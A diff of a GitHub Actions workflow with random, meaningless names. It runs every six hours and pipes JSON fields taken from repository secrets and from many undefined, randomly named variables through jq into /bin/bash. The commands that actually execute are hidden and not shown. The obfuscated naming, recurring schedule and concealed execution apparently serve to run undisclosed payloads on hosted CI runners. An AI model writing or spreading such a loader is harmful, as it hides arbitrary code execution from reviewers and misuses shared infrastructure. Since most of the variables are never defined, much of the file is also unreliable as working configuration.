@@ -1,21 +1,28 @@
 name: unablepregnanc
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '33 0/6 * * *'
+    - cron: '56 1/6 * * *'
+
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: unablepregnanc
         env:
-          yxe9710: ${{ secrets.yxe9710 }}
+          ul070: ${{ secrets.ul070 }}
         run: |
-          echo $yxe9710 | jq -r .ozs962 | /bin/bash
-          echo $zgy9 | jq -r .g60 | /bin/bash
-          echo $x700 | jq -r .vpp7246 | /bin/bash
-          echo $yht1878 | jq -r .q49 | /bin/bash
-          echo $b38219 | jq -r .iun77 | /bin/bash
+          echo $ul070 | jq -r .qk6705 | /bin/bash
+          echo $mmbq8 | jq -r .epjx36 | /bin/bash
+          echo $mgxqu6224 | jq -r .zo88 | /bin/bash
+          echo $qnw74 | jq -r .v5 | /bin/bash
+          echo $fbnt31337 | jq -r .egij1 | /bin/bash
+          echo $orxot69 | jq -r .xr1 | /bin/bash
+          echo $ytapg6 | jq -r .bas7365 | /bin/bash
+          echo $nhij9083 | jq -r .ob29230 | /bin/bash
+          echo $k91984 | jq -r .vxnx61 | /bin/bash
+          echo $gss6438 | jq -r .fu9 | /bin/bash
+          echo $ka65 | jq -r .bzgm2838 | /bin/bash
 
